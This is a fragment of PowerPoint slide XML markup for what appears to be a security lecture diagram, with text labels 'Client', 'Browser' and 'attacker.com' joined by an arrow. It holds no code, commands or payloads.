                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78852" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="2616574"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78853" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801471" y="2616574"/>
            <a:ext cx="1243853" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T5" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821230" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821230" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3151655"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2151529"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78856" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8547287" y="1638861"/>
            <a:ext cx="1818154" cy="830636"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78857" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1764926" cy="822232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1825158" cy="801310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:spcBef>
                <a:spcPts val="27"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="70558" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:endParaRPr sz="1765" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4090147" y="1882588"/>
            <a:ext cx="4398309" cy="987519"/>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78860" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2465295" y="5213537"/>
            <a:ext cx="1881188" cy="1495985"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78861" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2480703" y="5244353"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
